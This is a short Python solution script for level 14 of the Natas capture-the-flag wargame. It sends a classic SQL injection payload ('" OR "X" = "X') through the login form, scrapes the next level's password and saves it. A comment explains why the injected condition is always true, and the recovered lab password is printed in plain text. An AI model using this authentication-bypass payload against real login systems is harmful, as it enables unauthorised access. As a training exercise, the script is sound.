from bs4 import BeautifulSoup
import requests
import re

def req():
    res = requests.get(url=url,auth=lvl_pass, params=my_params)
    return re.search(r"[a-zA-Z0-9]{32}",BeautifulSoup(res.text, 'html.parser').find("div",id="content").text)[0]

lvl = '14'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_params = {"username":"", "password": '" OR "X" = "X'}

open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(req())


'''
Who doesn't love a good bit of SQL Injection?

SELECT * FROM `users` WHERE username = ? AND password = ?; #That's a hard condition to fill! But with a little change in the password
                                                           #section (with implicit parentheses added):
SELECT * FROM `users` WHERE (username = ? AND password = ?) OR "X" = "X"; # Much easier to satisfy!

Username: natas15
Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
'''
